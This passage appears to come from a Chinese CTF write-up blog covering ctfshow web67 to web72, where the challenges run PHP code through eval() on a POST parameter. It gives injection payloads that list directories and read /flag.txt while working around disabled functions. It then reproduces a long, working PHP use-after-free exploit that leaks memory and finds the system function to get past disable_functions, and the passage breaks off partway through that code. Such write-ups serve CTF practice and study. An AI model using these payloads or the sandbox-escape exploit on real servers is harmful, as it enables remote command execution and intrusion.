class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><p>这道题禁用了print_r函数！</p><hr /><h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无代码</span><br></pre></td></tr></table></figure><p>这个有点像黑盒测试！<br>根据上题，先查看目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure><p>然后打印flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br><span class="line">这里highlight_file()函数给禁用了！</span><br></pre></td></tr></table></figure><hr /><h1 id="web69-web70"><a href="#web69-web70" class="headerlink" title="web69~web70"></a>web69~web70</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无代码</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;read()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><p>前面4个print_r都被禁用了，我们使用后面四个任意一个都可以，原理是通过遍历数组的形式进行读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样子就在根目录下找到flag了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><hr /><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无代码</span><br></pre></td></tr></table></figure><p>继续上一题的代码！</p><hr /><h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>源码是在附件里面的，直接上页面时报错吓到我了！<br>可以看到它将数字和字母都给替换成了？号啦！<br>这里是不可以直接使用include()，但是我们可以看到其语句是在eval后面执行的，所以我们就可以加个强制退出就行了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure><hr /><h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>用这个进行查看目录，上一个不行了，被干趴下了！</p><blockquote><p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开<br><br>disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p></blockquote><p>然后我找个大师傅的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span 